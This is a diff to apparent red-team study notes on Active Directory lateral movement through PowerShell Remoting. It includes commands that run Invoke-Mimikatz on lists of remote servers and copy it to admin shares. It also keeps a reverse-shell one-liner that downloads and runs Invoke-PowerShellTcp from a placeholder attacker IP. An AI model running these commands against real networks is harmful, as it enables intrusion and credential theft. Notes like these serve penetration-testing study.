@@ -1,6 +1,19 @@
 # AD - Lateral Movement / Connections
 
-## **Connections**
+## **Basics**
+
+**PowerShell Remoting**
+
+* Its like psexec on steroids
+* Enabled by default on Server 2012 and newer
+* May need to enable remoting Enable-PSRemoting (admin privs required) e.g Win10
+* You get an elevated shell if admin creds are use - so a lot of UAC Issues are not relevant
+* Port 5985/5986 (SSL Encrypted) - is used (based on WinRM)
+* One-To-One or One-To-Many (non-interactive, executes parallely)&#x20;
+* Credentials are not left on target unless CredSSP/Unconstraned Delegation?
+* Runs in process "wsmprovhost" and is stateful
+
+## **Connections / PowerShellRemoting**
 
 **Access C disk of a computer (check local admin)**\
 ls \\\\\[hostname]\c$
@@ -9,26 +22,26 @@ ls \\\\\[hostname]\c$
 ****Enter-PSSession -Computername
 
 **Save and use sessions of a machine**\
-****$sess = New-PSSession -Computername\
+****$sess = New-PSSession -Computername hostname.local\
 Enter-PSSession $sess
 
-**Powershell reverse shell**\
-powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000
+**Execute commands on a machine (non-interactive)**\
+Invoke-Command -Scriptblock {whoami} -Computername (Get-Content \<list-of-servers-file>) \
+Invoke-Command -Computername hostname -Scriptblock {whoami;hostname}
 
-**Execute commands on a machine**\
-Invoke-Command -Computername -Scriptblock {whoami}\
-Invoke-Command -Computername -Scriptblock {whoami}
-
-**Load script on a machine**\
-****Invoke-Command -Computername -FilePath\
+**Execute script on a machine**\
+****Invoke-Command -Computername (Get-Content \<list-of-servers-file>) -FilePath  C:\scripty\a.ps1\
 Invoke-Command -FilePath $sess
 
-**Execute locally loaded function on a list of remote machines**\
+&#x20; **Execute locally loaded function on a list of remote machines**\
 Invoke-Command -Scriptblock ${function:} -Computername (Get-Content \<list\_of\_servers>)\
 Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content \<list\_of\_servers>)
 
 **Copy script to other server**\
-****Copy-Item .\Invoke-MimikatzEx.ps1 \\\hostname\c$\\'Program Files'\
+****Copy-Item .\Invoke-MimikatzEx.ps1 \\\hostname\c$\\'Program Files'
+
+**Powershell reverse shell**\
+powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000\
 ****
 
 ```
